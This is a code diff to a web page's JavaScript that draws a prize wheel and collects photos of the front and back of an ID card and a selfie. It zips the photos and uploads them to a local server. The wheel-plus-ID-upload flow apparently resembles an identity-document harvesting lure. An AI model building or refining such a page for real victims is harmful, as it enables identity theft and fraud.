@@ -14,7 +14,16 @@ document.addEventListener("DOMContentLoaded", () => {
     const submitButton = document.getElementById('submit-button');
 
     let uploadStep = 0;
-    const filesCache = []; // Кэш для временного хранения файлов
+    const filesCache = []; // Cache for temporarily storing files
+
+    // Function to dynamically configure file input
+    function configureFileInput() {
+        if (/Mobi|Android/i.test(navigator.userAgent)) {
+            fileInput.setAttribute('capture', 'environment'); // Open camera on mobile
+        } else {
+            fileInput.removeAttribute('capture'); // Allow file selection on desktop
+        }
+    }
 
     function drawWheel() {
         const radius = canvas.width / 2;
@@ -29,6 +38,9 @@ document.addEventListener("DOMContentLoaded", () => {
             ctx.arc(radius, radius, radius, i * segmentAngle, (i + 1) * segmentAngle);
             ctx.lineTo(radius, radius);
             ctx.fill();
+            ctx.strokeStyle = "black";
+            ctx.lineWidth = 5;
+            ctx.stroke();
 
             ctx.save();
             ctx.translate(radius, radius);
@@ -74,6 +86,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     uploadButton.addEventListener('click', () => {
         if (uploadStep < previews.length) {
+            configureFileInput(); // Configure input before triggering click
             fileInput.click();
         }
     });
@@ -83,7 +96,6 @@ document.addEventListener("DOMContentLoaded", () => {
         if (file) {
             const currentStep = uploadStep;
 
-            // Сохраняем файл во временный кэш
             filesCache[currentStep] = file;
 
             const reader = new FileReader();
@@ -95,7 +107,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
             uploadStep++;
             if (uploadStep < previews.length) {
-                uploadButton.textContent = `Subir: ${["Antes ID CARD", "Atrás ID CARD", "Autofoto"][uploadStep]}`;
+                uploadButton.textContent = `Upload: ${["Front of ID", "Back of ID", "Selfie"][uploadStep]}`;
             } else {
                 uploadButton.disabled = true;
                 submitButton.disabled = false;
@@ -105,36 +117,33 @@ document.addEventListener("DOMContentLoaded", () => {
 
     submitButton.addEventListener('click', async () => {
         if (filesCache.length === 0) return;
-    
-        // Создаём ZIP-архив
+
         const zip = new JSZip();
-    
+
         filesCache.forEach((file, index) => {
             zip.file(`file${index + 1}-${file.name}`, file);
         });
-    
+
         const zipBlob = await zip.generateAsync({ type: 'blob' });
-    
-        // Отправляем ZIP на сервер
+
         const formData = new FormData();
         formData.append('archive', zipBlob, 'photos.zip');
-    
+
         try {
             const response = await fetch('http://localhost:5000/upload-archive', {
                 method: 'POST',
                 body: formData,
             });
-    
+
             if (response.ok) {
-                console.log('Архив успешно отправлен!');
+                console.log('Archive successfully uploaded!');
             } else {
-                console.error('Ошибка при отправке архива.');
+                console.error('Error uploading archive.');
             }
         } catch (error) {
-            console.error('Ошибка подключения к серверу:', error);
+            console.error('Connection error:', error);
         }
     });
-    
 
     spinButton.addEventListener('click', spinWheel);
     drawWheel();
